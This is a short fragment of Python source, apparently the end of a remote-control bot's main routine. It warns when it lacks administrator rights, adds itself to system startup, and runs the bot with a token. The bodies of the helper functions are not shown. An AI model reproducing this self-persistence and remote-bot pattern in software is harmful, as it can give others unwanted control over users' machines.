        print("⚠️  WARNING: Not running as administrator")
        print("⚠️  Some commands may fail")
        print()
    
    if not is_in_startup():
        print(f"📝 Adding '{STARTUP_NAME}' to startup...")
        add_to_startup()
    
    bot.run(BOT_TOKEN)
